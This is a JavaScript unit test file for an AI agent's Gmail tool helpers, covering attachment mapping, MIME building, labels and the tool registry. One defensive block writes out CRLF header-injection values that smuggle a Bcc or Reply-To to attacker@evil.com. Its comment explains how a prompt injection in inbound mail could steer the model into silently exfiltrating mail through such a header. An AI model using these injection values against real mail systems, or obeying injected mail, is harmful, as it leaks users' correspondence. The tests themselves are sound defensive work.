/**
 * Unit tests for the Gmail tool helpers. Pure logic — no network/DB.
 *
 * Run: node integrations/gmailTools.test.js   (or: node --test)
 *
 * Covers the mapping fixes (attachments carry messageId/threadId), the
 * content-agnostic mimeType guessing, the shared MIME builder used by
 * compose + draft, label name→id resolution, and the tool registry.
 */

const assert = require('assert');

const {
    GMAIL_TOOLS,
    isGmailTool,
    extractAttachments,
    guessMimeTypeFromName,
    resolveLabelIds,
    buildRawMessage,
    summarizeSearchMessage,
    SEARCH_METADATA_HEADERS,
} = require('./gmailTools');

(async () => {
    // ── extractAttachments stamps messageId/threadId + recurses parts ───
    {
        const payload = {
            parts: [
                { mimeType: 'text/plain', body: { data: 'aGk=' } },
                { filename: 'invoice.pdf', mimeType: 'application/pdf', body: { size: 100, attachmentId: 'att-a' } },
                { mimeType: 'multipart/mixed', parts: [
                    { filename: 'logo.png', mimeType: 'image/png', body: { size: 50, attachmentId: 'att-b' } },
                ] },
            ],
        };
        const atts = extractAttachments(payload, { messageId: 'm1', threadId: 't1' });
        assert.strictEqual(atts.length, 2, 'finds nested + top-level attachments, skips body parts');
        assert.strictEqual(atts[0].attachmentId, 'att-a');
        assert.strictEqual(atts[0].messageId, 'm1', 'attachment carries messageId for self-contained forEach');
        assert.strictEqual(atts[0].threadId, 't1', 'attachment carries threadId');
        assert.strictEqual(atts[0].canOCR, true, 'pdf → canOCR true');
        assert.strictEqual(atts[1].filename, 'logo.png');
        assert.strictEqual(atts[1].canOCR, false, 'png → canOCR false');
        assert.strictEqual(atts[1].messageId, 'm1', 'nested attachment also carries messageId');
    }

    // ── extractAttachments: single-part message (payload IS the file) ───
    {
        const single = { filename: 'c.pdf', mimeType: 'application/pdf', body: { size: 10, attachmentId: 'att-c' } };
        const a = extractAttachments(single, { messageId: 'm2' });
        assert.strictEqual(a.length, 1);
        assert.strictEqual(a[0].messageId, 'm2');
        assert.strictEqual(a[0].threadId, null, 'threadId defaults to null when not provided');
    }

    // ── extractAttachments: no ctx → ids null (back-compat) ─────────────
    {
        const a = extractAttachments({ parts: [{ filename: 'x.pdf', mimeType: 'application/pdf', body: { attachmentId: 'z' } }] });
        assert.strictEqual(a[0].messageId, null);
        assert.strictEqual(a[0].threadId, null);
    }

    // ── guessMimeTypeFromName ──────────────────────────────────────────
    {
        assert.strictEqual(guessMimeTypeFromName('a.pdf'), 'application/pdf');
        assert.strictEqual(guessMimeTypeFromName('a.PNG'), 'image/png', 'case-insensitive extension');
        assert.strictEqual(guessMimeTypeFromName('a.docx'), 'application/vnd.openxmlformats-officedocument.wordprocessingml.document');
        assert.strictEqual(guessMimeTypeFromName('a.csv'), 'text/csv');
        assert.strictEqual(guessMimeTypeFromName('weird.xyz'), 'application/octet-stream', 'unknown ext → octet-stream');
        assert.strictEqual(guessMimeTypeFromName('noext'), 'application/octet-stream');
    }

    // ── resolveLabelIds: names→ids, ids/system pass through ─────────────
    {
        const fakeGmail = { users: { labels: { list: async () => ({ data: { labels: [
            { id: 'INBOX', name: 'INBOX', type: 'system' },
            { id: 'Label_3', name: 'Work', type: 'user' },
        ] } }) } } };
        assert.deepStrictEqual(await resolveLabelIds(fakeGmail, ['Work']), ['Label_3'], 'user-label name resolves to id');
        assert.deepStrictEqual(await resolveLabelIds(fakeGmail, ['INBOX', 'UNREAD']), ['INBOX', 'UNREAD'], 'system labels / unknown pass through');
        assert.deepStrictEqual(await resolveLabelIds(fakeGmail, 'Work'), ['Label_3'], 'single string is accepted');
        assert.deepStrictEqual(await resolveLabelIds(fakeGmail, []), [], 'empty → empty (no list call)');
        assert.deepStrictEqual(await resolveLabelIds(fakeGmail, undefined), [], 'undefined → empty');
    }

    // ── buildRawMessage: produces decodable RFC 2822 (compose + draft) ──
    {
        const decode = (raw) => Buffer.from(raw.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('utf-8');
        const raw = buildRawMessage({ to: 'a@b.com', subject: 'Hello', body: 'Body text', userEmail: 'me@x.com' });
        const decoded = decode(raw);
        assert.ok(decoded.includes('To: a@b.com'), 'To header present');
        assert.ok(decoded.includes('From: me@x.com'), 'From header present');
        assert.ok(decoded.includes('Subject: Hello'), 'plain subject present');
        const body = decoded.split('\r\n\r\n')[1];
        assert.strictEqual(Buffer.from(body, 'base64').toString('utf-8'), 'Body text', 'body round-trips');

        // Non-ASCII subject is RFC 2047 encoded.
        const raw2 = buildRawMessage({ to: 'a@b', subject: 'Factüur €', body: 'x', userEmail: '' });
        assert.ok(decode(raw2).includes('=?UTF-8?B?'), 'non-ascii subject encoded');

        // Reply threading headers.
        const raw3 = buildRawMessage({ to: 'a@b', subject: 'Re: x', body: 'x', inReplyTo: '<msg-1@mail>', references: '<root@mail>' });
        const dec3 = decode(raw3);
        assert.ok(dec3.includes('In-Reply-To: <msg-1@mail>'), 'In-Reply-To header');
        assert.ok(dec3.includes('References: <root@mail> <msg-1@mail>'), 'References appends In-Reply-To');
    }

    // ── buildRawMessage: no CRLF header injection ──────────────────────
    // Every header value here is attacker-reachable: to/cc/bcc/subject are
    // model arguments (a prompt injection in inbound mail picks them on the
    // autoSend path), In-Reply-To/References are lifted off the untrusted
    // message being replied to. A bare CR/LF used to open a new header, so
    // subject "…\r\nBcc: attacker@evil.com" produced a real Bcc that
    // messages.send honoured — silent exfiltration with no approval step.
    {
        const decode = (raw) => Buffer.from(raw.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('utf-8');
        const injected = /(^|\r\n)Bcc: attacker@evil\.com/;

        const viaSubject = decode(buildRawMessage({
            to: 'victim@example.com', subject: 'Invoice paid\r\nBcc: attacker@evil.com',
            body: 'hi', userEmail: 'me@x.com',
        }));
        assert.ok(!injected.test(viaSubject), 'CRLF in subject does not forge a Bcc header');
        assert.ok(viaSubject.includes('Subject: Invoice paid Bcc: attacker@evil.com'),
            'the injection degrades to visible subject text');

        const viaTo = decode(buildRawMessage({
            to: 'victim@example.com\nBcc: attacker@evil.com', subject: 'x', body: 'hi',
        }));
        assert.ok(!injected.test(viaTo), 'bare LF in `to` does not forge a header');

        const viaCc = decode(buildRawMessage({
            to: 'a@b', cc: 'c@d\rBcc: attacker@evil.com', subject: 'x', body: 'hi',
        }));
        assert.ok(!injected.test(viaCc), 'bare CR in `cc` does not forge a header');

        const viaBcc = decode(buildRawMessage({
            to: 'a@b', bcc: 'ok@d\r\nReply-To: attacker@evil.com', subject: 'x', body: 'hi',
        }));
        assert.ok(!/(^|\r\n)Reply-To:/.test(viaBcc), 'CRLF in `bcc` does not forge a Reply-To');

        const viaThreading = decode(buildRawMessage({
            to: 'a@b', subject: 'x', body: 'hi',
            inReplyTo: '<m@x>\r\nBcc: attacker@evil.com', references: '<r@x>',
        }));
        assert.ok(!injected.test(viaThreading), 'CRLF in reply headers taken off untrusted mail is neutralised');

        // Doubled CRLF must not end the header block early and forge a body.
        const viaBody = decode(buildRawMessage({ to: 'a@b', subject: 'x\r\n\r\nFAKE', body: 'real', userEmail: '' }));
        assert.strictEqual(viaBody.split('\r\n\r\n').length, 2, 'exactly one header/body separator');
        assert.strictEqual(Buffer.from(viaBody.split('\r\n\r\n')[1], 'base64').toString('utf-8'), 'real',
            'the real body still round-trips');

        // Sanitising must not disturb ordinary values.
        const clean = decode(buildRawMessage({
            to: 'a@b.com', cc: 'c@d.com', bcc: 'e@f.com', subject: 'Quarterly report',
            body: 'text', userEmail: 'me@x.com',
        }));
        assert.ok(clean.includes('Subject: Quarterly report'));
        assert.ok(clean.includes('\r\nBcc: e@f.com'), 'a legitimate Bcc is still sent');
    }

    // ── tool registry: new ops present + isGmailTool ───────────────────
    {
        const names = GMAIL_TOOLS.map(t => t.function.name);
        const expected = [
            'gmail_search', 'gmail_read', 'gmail_read_attachment', 'gmail_compose',
            'gmail_list_labels', 'gmail_modify_labels', 'gmail_mark_read', 'gmail_mark_unread',
            'gmail_archive', 'gmail_trash', 'gmail_create_draft',
        ];
        for (const n of expected) {
            assert.ok(names.includes(n), `GMAIL_TOOLS includes ${n}`);
            assert.ok(isGmailTool(n), `isGmailTool(${n}) is true`);
        }
        assert.ok(!isGmailTool('drive_search'), 'isGmailTool rejects non-gmail tools');
        // read_attachment exposes the new mimeType input.
        const ra = GMAIL_TOOLS.find(t => t.function.name === 'gmail_read_attachment');
        assert.ok(ra.function.parameters.properties.mimeType, 'gmail_read_attachment accepts mimeType');
    }

    // ── gmail_search declares its cap so the builder can SHOW it ───────
    // BFSF-358A: the "(default 10)" lived only in the prose description, so
    // the builder rendered an empty box with no default to fall back on and
    // authors processed 10 of 201 matching mails without ever seeing a limit.
    // The builder paints a property's `default` as the field's placeholder
    // (agent-hub mapping/ToolInputForm.jsx → describeExample), so the declared
    // default IS the visible one.
    {
        const search = GMAIL_TOOLS.find(t => t.function.name === 'gmail_search');
        const maxResults = search.function.parameters.properties.maxResults;
        assert.strictEqual(maxResults.default, 10, 'gmail_search.maxResults declares its default');
        assert.strictEqual(maxResults.type, 'integer');
        // The prose must not contradict the declared value.
        assert.ok(/default 10/.test(maxResults.description), 'description still names the same default');
    }

    // ── gmail_search marks bulk mail from its headers, never leaks them ──
    {
        assert.ok(SEARCH_METADATA_HEADERS.includes('List-Unsubscribe'), 'asks Gmail for List-Unsubscribe');
        assert.ok(SEARCH_METADATA_HEADERS.includes('Precedence'), 'asks Gmail for Precedence');
        const h = (pairs) => ({ id: 'm1', snippet: 's', payload: { headers: pairs.map(([name, value]) => ({ name, value })) } });

        const news = summarizeSearchMessage(h([
            ['From', 'News <news@example.com>'], ['Subject', 'Weekly'],
            ['list-unsubscribe', '<mailto:unsub@example.com>, <https://example.com/u?x=1>'],
        ]));
        assert.strictEqual(news.hasListUnsubscribe, true, 'header match is case-insensitive');
        assert.strictEqual(news.isBulk, true);
        assert.strictEqual(news.precedence, null);
        assert.ok(!JSON.stringify(news).includes('unsub@example.com'), 'the raw List-Unsubscribe value is not passed on');

        const bulk = summarizeSearchMessage(h([['Precedence', ' Bulk ']]));
        assert.strictEqual(bulk.precedence, 'bulk');
        assert.strictEqual(bulk.isBulk, true);
        assert.strictEqual(bulk.subject, '(no subject)');

        const personal = summarizeSearchMessage(h([['From', 'a@b.nl'], ['Subject', 'Hi'], ['Date', 'Mon, 1 Jan 2026']]));
        assert.deepStrictEqual(
            { hasListUnsubscribe: personal.hasListUnsubscribe, precedence: personal.precedence, isBulk: personal.isBulk },
            { hasListUnsubscribe: false, precedence: null, isBulk: false },
        );
        assert.strictEqual(personal.id, 'm1');
        assert.strictEqual(personal.date, 'Mon, 1 Jan 2026');
    }

    console.log('integrations/gmailTools.test.js — all checks passed');
})().catch((err) => { console.error(err); process.exit(1); });
